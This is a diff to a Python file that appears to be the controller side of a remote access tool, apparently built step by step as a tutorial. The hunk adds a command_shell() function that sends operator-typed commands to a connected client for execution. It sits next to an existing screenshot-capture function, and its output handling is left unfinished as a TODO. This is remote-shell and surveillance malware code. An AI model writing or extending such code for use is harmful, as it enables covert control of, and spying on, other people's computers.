@@ -299,9 +299,30 @@ def screenshot(all_monitors=True):
     except Exception as e:
         print(fColors.LIGHT_RED + f"[-] Error while Saving Screenshot.\nError: {fColors.RESET}{e}")
 
-
+# Step 33: Define `command_shell()` Function to 1. Receive Prompt, 2. Send Command, 3. Receive Command Output
 def command_shell():
-    pass
+    send(b'cmd')
+
+    # in the Firs Receive we give the prompt
+    while True:
+        strCommand = input('>> ')
+
+        # Send 'goback' to the client to close the Command Prompt and Back to the Command Mode(menu)
+        if strCommand == 'quit' or strCommand == 'exit':
+            send(b'goback')
+
+        # we can't use the 'cmd' Command in the Command prompt, so we should check it
+        elif strCommand == 'cmd':
+            print(fColors.LIGHT_RED +
+                  "[-] You Can't Use Command Prompt in the Command Prompt, Don't Use 'cmd' Command" + fColors.RESET)
+
+        # elif len(str(strCommand)) > 0 Mean Command Submit and should send to the Client
+        elif len(str(strCommand)) > 0:
+            send(str.encode(strCommand))
+
+            # Second Receive we give the output(STDOUT+STDERR) of the Executed Command
+            # TODO: Complete this
+
 
 
 # Step 19: Define `send_commands()` Function to Send Commands to the Client
